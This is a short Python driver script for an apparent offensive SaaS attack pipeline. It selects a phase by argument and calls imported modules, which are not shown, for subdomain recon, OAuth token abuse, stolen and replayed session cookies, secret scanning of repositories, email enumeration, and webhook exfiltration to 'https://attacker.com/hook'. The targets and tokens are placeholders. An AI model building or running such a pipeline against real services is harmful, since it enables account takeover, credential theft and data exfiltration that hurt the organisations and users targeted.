import sys
from modules import (
    recon_saas,
    saas_persistence,
    defense_evasion,
    credential_access,
    discovery,
    lateral_movement,
    exfiltration
)

def run(phase):
    if phase == "recon":
        print(recon_saas.subdomain_enum("example.com"))
    elif phase == "privesc":
        print(saas_persistence.use_oauth_token("https://api.example.com", "TOKEN"))
    elif phase == "evasion":
        print(defense_evasion.use_stolen_cookie("https://target.com", "SESSION"))
    elif phase == "cred":
        print(credential_access.scan_repo_for_secrets("https://github.com/user/repo"))
    elif phase == "discovery":
        print(discovery.email_enum("example.com", "emails.txt"))
    elif phase == "lateral":
        print(lateral_movement.replay_session_cookie("https://target.com", "SESSION"))
    elif phase == "exfil":
        print(exfiltration.trigger_webhook_exfiltration("https://api.example.com", "https://attacker.com/hook"))
    else:
        print("Unknown phase. Use: recon, privesc, evasion, cred, discovery, lateral, exfil")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 run_pipeline.py [phase]")
    else:
        run(sys.argv[1])
